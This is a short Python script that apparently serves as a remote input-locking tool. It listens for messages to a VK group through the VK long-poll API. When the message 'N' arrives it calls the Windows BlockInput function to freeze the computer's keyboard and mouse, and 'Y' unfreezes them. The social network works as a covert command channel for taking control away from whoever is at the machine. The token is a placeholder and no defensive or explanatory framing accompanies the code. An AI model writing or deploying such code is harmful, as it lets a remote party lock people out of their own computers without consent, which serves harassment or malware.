import vk_api
from vk_api.longpoll import VkLongPoll, VkEventType
from ctypes import *
import time,os


token = "x"  #token from the VK group
vk_session = vk_api.VkApi(token = token)

session_api = vk_session.get_api()
longpoll = VkLongPoll(vk_session)



while True:
    for event in longpoll.listen():
        if event.type == VkEventType.MESSAGE_NEW:
            if str(event.text) == "N":   #Block

                windll.user32.BlockInput(True)
                print("All_Block")

            if str(event.text) == "Y":   #UnBlock
             
                windll.user32.BlockInput(False) 
                print("All_UnBlock")
